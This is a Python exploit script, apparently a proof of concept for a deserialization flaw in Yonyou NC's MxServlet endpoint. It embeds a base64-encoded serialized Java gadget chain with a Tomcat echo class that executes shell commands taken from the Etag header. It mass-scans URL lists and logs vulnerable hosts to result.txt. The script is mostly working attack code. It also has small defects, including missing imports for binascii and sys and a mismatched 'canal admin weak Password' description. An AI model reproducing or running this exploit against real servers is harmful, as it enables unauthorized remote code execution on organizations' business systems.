# -*- coding: utf-8 -*-
import time
import requests
import urllib3
from hashlib import md5
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib import parse
from rich.console import Console
import argparse
import re
import base64
import multiprocessing
from multiprocessing.dummy import Pool
import concurrent.futures
import json
import warnings
import random
warnings.filterwarnings("ignore")


def banner():
    test = """

8b        d8   88           88      a8P  88 888b      88   ,ad8888ba,   
 Y8,    ,8P  ,d88           88    ,88' ,d88 8888b     88  d8"'    `"8b  
  Y8,  ,8P 888888           88  ,88" 888888 88 `8b    88 d8'            
   "8aa8"      88           88,d88'      88 88  `8b   88 88             
    `88'       88           8888"88,     88 88   `8b  88 88      88888  
     88        88           88P   Y8b    88 88    `8b 88 Y8,        88  
     88        88           88     "88,  88 88     `8888  Y8a.    .a88  
     88        88           88       Y8b 88 88      `888   `"Y88888P"   

                 888888888888 

                 tag:  this is a 用友NC MxServlet poc                                       
                             @version: 1.0.0   @author: Y1_K1NG           
"""
    print(test)
def hex_decoding(Hex):
    string=binascii.a2b_hex(Hex)
    return string

def poc(target):
    if target[-1] == '/':
        target = target
    else:
        target = target + "/"
    url = target + 'servlet/~ic/nc.bs.framework.mx.MxServlet'
    headers = {
        'User-Agent': 'Mozilla/5.0 (X11; OpenBSD i386) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
        'Etag': 'echo y1k1ng'}
    payload = base64.b64decode(
        'UE9TVCAvc2VydmxldC9+aWMvbmMuYnMuZnJhbWV3b3JrLm14Lk14U2VydmxldCBIVFRQLzEuMQ0KRXRhZzogZWNobyBPcXVBdGdKWUI2DQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoY29tcGF0aWJsZTsgQmFpZHVzcGlkZXIvMi4wOyAraHR0cDovL3d3dy5iYWlkdS5jb20vc2VhcmNoL3NwaWRlci5odG1sKQ0KQ29udGVudC1UeXBlOiBhcHBsaWNhdGlvbi9vY3RldC1zdHJlYW0NCkNvbnRlbnQtTGVuZ3RoOiA1Mzk3DQpIb3N0OiBudHd0Lm50emxramMuY29tOjkwMDENCkNvbm5lY3Rpb246IGNsb3NlDQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCg0KrO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQABHN1MThzcgAqb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLm1hcC5MYXp5TWFwbuWUgp55EJQDAAFMAAdmYWN0b3J5dAAsTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAtW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnMvVHJhbnNmb3JtZXI7eHB1cgAtW0xvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuVHJhbnNmb3JtZXI7vVYq8dg0GJkCAAB4cAAAAAZzcgA7b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHEAfgADeHB2cgAqb3JnLm1vemlsbGEuamF2YXNjcmlwdC5EZWZpbmluZ0NsYXNzTG9hZGVyAAAAAAAAAAAAAAB4cHNyADpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuSW52b2tlclRyYW5zZm9ybWVyh+j/a3t8zjgCAANbAAVpQXJnc3QAE1tMamF2YS9sYW5nL09iamVjdDtMAAtpTWV0aG9kTmFtZXQAEkxqYXZhL2xhbmcvU3RyaW5nO1sAC2lQYXJhbVR5cGVzdAASW0xqYXZhL2xhbmcvQ2xhc3M7eHB1cgATW0xqYXZhLmxhbmcuT2JqZWN0O5DOWJ8QcylsAgAAeHAAAAABdXIAEltMamF2YS5sYW5nLkNsYXNzO6sW167LzVqZAgAAeHAAAAAAdAAOZ2V0Q29uc3RydWN0b3J1cQB+ABoAAAABdnEAfgAac3EAfgATdXEAfgAYAAAAAXVxAH4AGAAAAAB0AAtuZXdJbnN0YW5jZXVxAH4AGgAAAAF2cQB+ABhzcQB+ABN1cQB+ABgAAAACdAAlb3JnLmFwYWNoZS5sb2dnaW5nLnV0aWwuY3J5cHQuTm9DcnlwdHVyAAJbQqzzF/gGCFTgAgAAeHAAAA/iyv66vgAAADIA4wEAJW9yZy9hcGFjaGUvbG9nZ2luZy91dGlsL2NyeXB0L05vQ3J5cHQHAAEBABBqYXZhL2xhbmcvT2JqZWN0BwADAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQwABQAGCgAEAAkBAAFxAQAzKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW07AQAHZXhlY0NtZAwADQAMCgACAA4BAAg8Y2xpbml0PgEAHmphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbgcAEQEAH2phdmEvbGFuZy9Ob1N1Y2hNZXRob2RFeGNlcHRpb24HABMBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwAVAQAVamF2YS9sYW5nL1RocmVhZEdyb3VwBwAXAQAVamF2YS9sYW5nL0NsYXNzTG9hZGVyBwAZAQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQHABsBABNbTGphdmEvbGFuZy9UaHJlYWQ7BwAdAQAQamF2YS9sYW5nL1RocmVhZAcAHwEAEGphdmEvbGFuZy9TdHJpbmcHACEBAA5qYXZhL3V0aWwvTGlzdAcAIwEAHWphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtBwAlAQANU3RhY2tNYXBUYWJsZQEADWN1cnJlbnRUaHJlYWQBABQoKUxqYXZhL2xhbmcvVGhyZWFkOwwAKAApCgAgACoBAA5nZXRUaHJlYWRHcm91cAEAGSgpTGphdmEvbGFuZy9UaHJlYWRHcm91cDsMACwALQoAIAAuAQAVZ2V0Q29udGV4dENsYXNzTG9hZGVyAQAZKClMamF2YS9sYW5nL0NsYXNzTG9hZGVyOwwAMAAxCgAgADIBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsMADQANQoABAA2AQAHdGhyZWFkcwgAOAEAD2phdmEvbGFuZy9DbGFzcwcAOgEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsMADwAPQoAOwA+AQANc2V0QWNjZXNzaWJsZQEABChaKVYMAEAAQQoAHABCAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMAEQARQoAHABGAQAHZ2V0TmFtZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7DABIAEkKACAASgEABGV4ZWMIAEwBAAhjb250YWlucwEAGyhMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspWgwATgBPCgAiAFABAARodHRwCABSAQAGdGFyZ2V0CABUAQASamF2YS9sYW5nL1J1bm5hYmxlBwBWAQAGdGhpcyQwCABYAQAHaGFuZGxlcggAWgEADWdldFN1cGVyY2xhc3MMAFwANQoAOwBdAQAGZ2xvYmFsCABfAQAKcHJvY2Vzc29ycwgAYQEABHNpemUBAAMoKUkMAGMAZAsAJABlAQAVKEkpTGphdmEvbGFuZy9PYmplY3Q7DABEAGcLACQAaAEAA3JlcQgAagEAC2dldFJlc3BvbnNlCABsAQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwwAbgBvCgA7AHABABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QHAHIBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsMAHQAdQoAcwB2AQAJZ2V0SGVhZGVyCAB4AQAKQ01EX0hFQURFUgEAEkxqYXZhL2xhbmcvU3RyaW5nOwwAegB7CQACAHwBAAdpc0VtcHR5AQADKClaDAB+AH8KACIAgAEACXNldFN0YXR1cwgAggEAEWphdmEvbGFuZy9JbnRlZ2VyBwCEAQAEVFlQRQEAEUxqYXZhL2xhbmcvQ2xhc3M7DACGAIcJAIUAiAEABChJKVYMAAUAigoAhQCLDAALAAwKAAIAjQEAJG9yZy5hcGFjaGUudG9tY2F0LnV0aWwuYnVmLkJ5dGVDaHVuawgAjwEAB2Zvck5hbWUBAD0oTGphdmEvbGFuZy9TdHJpbmc7WkxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7KUxqYXZhL2xhbmcvQ2xhc3M7DACRAJIKADsAkwEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsMAJUAlgoAOwCXAQAIc2V0Qnl0ZXMIAJkBAAJbQgcAmwEAEWdldERlY2xhcmVkTWV0aG9kDACdAG8KADsAngEAC3RvQnl0ZUFycmF5AQAEKClbQgwAoAChCgAmAKIBAAd2YWx1ZU9mAQAWKEkpTGphdmEvbGFuZy9JbnRlZ2VyOwwApAClCgCFAKYBAAdkb1dyaXRlCACoAQATamF2YS5uaW8uQnl0ZUJ1ZmZlcggAqgEABHdyYXAIAKwBABNbTGphdmEvbGFuZy9TdHJpbmc7BwCuAQATamF2YS9pby9JbnB1dFN0cmVhbQcAsAEAB29zLm5hbWUIALIBABBqYXZhL2xhbmcvU3lzdGVtBwC0AQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwwAtgC3CgC1ALgBAAt0b0xvd2VyQ2FzZQwAugBJCgAiALsBAAN3aW4IAL0BAANjbWQIAL8BAAIvYwgAwQEACS9iaW4vYmFzaAgA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')
    payload = payload.split(b'\r\n\r\n')[1]
    try:
        response = requests.post(url,payload,headers=headers,verify=False,timeout=15)
        if 'y1k1ng' in response.text and 'echo' not in response.text:
            print(f"[+]{target} is valuable")
            with open("result.txt", "a+", encoding="utf-8") as f:
                f.write(target + "\n")
        else:
            print(f"[-]{target} is not valuable")
    except Exception as e:
        print(f"[*] {target} error: {str(e)}")


def extract_host(url):
    """
    从 URL 中提取主机地址和端口号，返回 (host, port)
    """
    match = re.search(r"(?:https?://)?([\w\.]+):?(\d+)?", url)
    if match:
        host, port = match.groups()
        if not port:
            if "https" in url:
                port = "443"
            else:
                port = "80"
        return host, int(port)
    else:
        return None, None

def main():
    banner()
    parser = argparse.ArgumentParser(description='canal admin weak Password')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
    args = parser.parse_args()
    if args.url and not args.file:
        host, port = extract_host(args.url)
        if host:
            if "https" in args.url:
                url = f"https://{host}:{port}"
            else:
                url = f"http://{host}:{port}"
            poc(url)
        else:
            print(f"Invalid URL: {args.url}")
    elif not args.url and args.file:
        url_list = []
        with open(args.file, "r", encoding="utf-8") as f:
            for url in f.readlines():
                url = url.strip().replace("\n", "")
                host, port = extract_host(url)
                if host:
                    if "https" in url:
                        url_list.append(f"https://{host}:{port}")
                    else:
                        url_list.append(f"http://{host}:{port}")
                else:
                    print(f"Invalid URL: {url}")

        mp = Pool(10)  # 创建一个拥有20个线程的线程池
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")


if __name__ == '__main__':
    main()
